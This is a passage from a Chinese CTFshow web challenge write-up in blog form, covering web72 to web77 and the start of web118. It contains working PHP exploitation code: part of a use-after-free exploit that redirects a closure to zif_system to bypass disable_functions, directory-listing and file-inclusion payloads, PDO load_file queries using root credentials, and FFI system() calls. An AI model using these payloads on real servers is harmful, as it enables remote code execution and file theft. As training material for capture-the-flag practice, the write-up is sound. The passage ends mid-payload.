&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#需要通过url编码，带着空格和换行符</span></span><br></pre></td></tr></table></figure>
+
+<p>globx协议:查找匹配的文件路径模式<img src="/2022/03/11/CTFshow2/image-20220220154722677-164701005467516.png" alt="image-20220220154722677"></p>
+<h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"> printf(<span class="variable">$f</span>-&gt;getFilename().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">都可，在flagc.txt里面</span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&quot;/flagx.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在flag36.txt</p>
+<p>include 无法使用，可以使用一些可使用的进程去读取flag。这里使用PDO(PHP Database Object)去执行sql语句进而读出flag，payload如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;<span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;echo(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = null;&#125;catch (PDOException <span class="variable">$e</span>) &#123;echo <span class="variable">$e</span>- &gt;getMessage();**<span class="keyword">exit</span>**(<span class="number">0</span>);&#125;**<span class="keyword">exit</span>**(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在<strong>PDO</strong>中，我们可以使用三种方式来执行<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&spm=1001.2101.3001.7020">SQL语句</a>，分别是 exec()方法，query方法，以及预处理语句prepare()和execute()方法</p>
+<p><img src="/2022/03/11/CTFshow2/image-20220220163455540-164701005467517.png" alt="image-20220220163455540"></p>
+<p>exec()方法返回执行SQL 语句后受影响的行数，其语法格式如下：</p>
+<p>参数 satatement 是要执行的SQL语句，该方法返回执行SQL 语句时受影响的行数，通常用于 INSERT，DELETE和UPDATE语句中</p>
+<p>query()方法用于返回执行查询后的结果集，该函数的语法格式如下如下：</p>
+<p>参数 satatement 是要执行的 SQL语句，它返回的是一个PODStatement对象！</p>
+<p>注意:</p>
+<p>1、query和exec都可以执行所有的sql语句，只是返回值不同而已。</p>
+<p>2、query可以实现所有exec的功能。</p>
+<p>3、当把select语句应用到 exec 时，总是返回 0</p>
+<p>4、如果要看查询的具体结果，可以通过foreach语句完成循环输出</p>
+<p>第三种种方法：预处理语句：prepare()语句和execute()语句</p>
+<p>预处理语句包括prepare()和execute()两种方法。首先，通过prepare()方法做查询准备工作，然后通过execute()方法执行查询，并且还可以通过bindParam()方法来绑定参数给execute()方法</p>
+<p><strong>php中的“-&gt;”符号</strong>被称为箭头<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%90%E7%AE%97%E7%AC%A6&spm=1001.2101.3001.7020">运算符</a>，箭头运算符左侧是获取类的实例，右侧将指定左侧类的方法和属性并进行<strong>调用</strong></p>
+<h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在flag36d.txt</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;<span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;echo(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = null;&#125;catch (PDOException <span class="variable">$e</span>) &#123;echo <span class="variable">$e</span> -&gt; getMessage();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>使用上面的方法得到<img src="/2022/03/11/CTFshow2/image-20220220190908376-164701005467518.png" alt="image-20220220190908376"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);&#125; <span class="keyword">exit</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>读取目录：flag36x.txt是上面图片的内容，还有一个readflag文件</p>
+<p><img src="/2022/03/11/CTFshow2/image-20220220190951090-164701005467519.png" alt="image-20220220190951090"></p>
+<p>还是常使用POD读取flag36x.php但是失败了，根据提示使用PHP7.4以上才有的FFI进行命令执行</p>
+<p>readflag是专门用来读flag的。然后访问<code>/1.txt</code>即可。</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/03/11/CTFshow2/image-20220220192653988-164701005467520.png" alt="image-20220220192653988"></p>
+<p>system函数：<br>原型：int system(const char * command)；<br>功能：执行 dos(windows系统) 或 shell(Linux/Unix系统) 命令，参数字符串command为命令名;<br>说明：在windows系统中，system函数直接在控制台调用一个command命令。在Linux/Unix系统中，system函数会调用fork函数产生子进程，由子进程来执行command命令，命令执行完后随即返回原调用的进程；</p>
+<p><strong>FFI</strong></p>
+<p>外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。 </p>
+<p>FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/133809650">https://zhuanlan.zhihu.com/p/133809650</a></p>
+<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p><img src="/2022/03/11/CTFshow2/image-20220220194519359-164701005467521.png" alt="image-20220220194519359"></p>
+<p><img src="/2022/03/11/CTFshow2/image-20220220194703989-164701005467522.png" alt="image-20220220194703989"></p>
+<p>也就是我们输入的命令会被执行，但是诸如<code>ls</code>，<code>id</code>之类的都被ban了</p>
+<p>大写字母没被过滤</p>
+<p>首先给我们了两个hint点</p>
+<p>hint1：<img src="/2022/03/11/CTFshow2/image-20220220201703149-164701005467523.png" alt="image-20220220201703149"></p>
+<p>hint2：为两个payload</p>
+<pre><code>$&#123;PATH:$
+</code></pre>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/STUDY/" rel="tag"># STUDY</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/10/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="文件上传">
+                  <i class="fa fa-chevron-left"></i> 文件上传
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/20/CTFshow-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="CTFshow-反序列化">
+                  CTFshow-反序列化 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CJ</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">492k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">7:28</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
